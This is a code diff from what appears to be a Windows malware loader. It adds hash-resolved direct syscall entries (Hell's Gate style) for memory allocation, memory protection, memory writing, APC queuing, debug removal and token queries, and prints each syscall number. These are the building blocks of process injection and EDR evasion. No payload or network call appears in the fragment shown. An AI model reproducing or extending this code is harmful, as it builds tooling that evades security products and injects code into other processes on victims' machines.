@@ -71,6 +71,7 @@ BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDire
 	return TRUE;
 }
 
+// TODO: refactor
 BOOL InitializeSyscalls() {
 	//PRINTA("[i] Initializing Syscalls Table...\n");
 
@@ -100,6 +101,15 @@ BOOL InitializeSyscalls() {
 	g_SyscallsTable.NtWaitForSingleObject.dwHash = NtWaitForSingleObjectHashValue;
 	g_SyscallsTable.NtQuerySystemInformation.dwHash = NtQuerySystemInformationHashValue;
 	g_SyscallsTable.NtDelayExecution.dwHash = NtDelayExecutionHashValue;
+	g_SyscallsTable.NtAllocateVirtualMemory.dwHash = NtAllocateVirtualMemoryHashValue;
+	g_SyscallsTable.NtProtectVirtualMemory.dwHash = NtProtectVirtualMemoryHashValue;
+	g_SyscallsTable.NtWriteVirtualMemory.dwHash = NtWriteVirtualMemoryHashValue;
+	g_SyscallsTable.NtQueueApcThread.dwHash = NtQueueApcThreadHashValue;
+	g_SyscallsTable.NtQueryInformationProcess.dwHash = NtQueryInformationProcessHashValue;
+	g_SyscallsTable.NtRemoveProcessDebug.dwHash = NtRemoveProcessDebugHashValue;
+	g_SyscallsTable.NtFreeVirtualMemory.dwHash = NtFreeVirtualMemoryHashValue;
+	g_SyscallsTable.NtOpenProcessToken.dwHash = NtOpenProcessTokenHashValue;
+	g_SyscallsTable.NtQueryInformationToken.dwHash = NtQueryInformationTokenHashValue;
 
 	if (!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtCreateSection) ||
 		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtMapViewOfSection) ||
@@ -108,7 +118,16 @@ BOOL InitializeSyscalls() {
 		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtCreateThreadEx) ||
 		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtWaitForSingleObject) ||
 		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtQuerySystemInformation) ||
-		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtDelayExecution)
+		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtDelayExecution) ||
+		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtAllocateVirtualMemory) ||
+		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtProtectVirtualMemory) ||
+		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtWriteVirtualMemory) ||
+		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtQueueApcThread) ||
+		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtQueryInformationProcess) ||
+		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtRemoveProcessDebug) ||
+		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtFreeVirtualMemory) ||
+		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtOpenProcessToken) ||
+		!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtQueryInformationToken)
 		)
 		return FALSE;
 
@@ -121,6 +140,15 @@ BOOL InitializeSyscalls() {
 	PRINTA("[+] NtWaitForSingleObject SSN %d\n", g_SyscallsTable.NtWaitForSingleObject.wSystemCall);
 	PRINTA("[+] NtQuerySystemInformation SSN %d\n", g_SyscallsTable.NtQuerySystemInformation.wSystemCall);
 	PRINTA("[+] NtDelayExecution SSN %d\n", g_SyscallsTable.NtDelayExecution.wSystemCall);
+	PRINTA("[+] NtAllocateVirtualMemory SSN %d\n", g_SyscallsTable.NtAllocateVirtualMemory.wSystemCall);
+	PRINTA("[+] NtProtectVirtualMemory SSN %d\n", g_SyscallsTable.NtProtectVirtualMemory.wSystemCall);
+	PRINTA("[+] NtWriteVirtualMemory SSN %d\n", g_SyscallsTable.NtWriteVirtualMemory.wSystemCall);
+	PRINTA("[+] NtQueueApcThread SSN %d\n", g_SyscallsTable.NtQueueApcThread.wSystemCall);
+	PRINTA("[+] NtQueryInformationProcess SSN %d\n", g_SyscallsTable.NtQueryInformationProcess.wSystemCall);
+	PRINTA("[+] NtRemoveProcessDebug SSN %d\n", g_SyscallsTable.NtRemoveProcessDebug.wSystemCall);
+	PRINTA("[+] NtFreeVirtualMemory SSN %d\n", g_SyscallsTable.NtFreeVirtualMemory.wSystemCall);
+	PRINTA("[+] NtOpenProcessToken SSN %d\n", g_SyscallsTable.NtOpenProcessToken.wSystemCall);
+	PRINTA("[+] NtQueryInformationToken SSN %d\n", g_SyscallsTable.NtQueryInformationToken.wSystemCall);
 
 	return TRUE;
 }
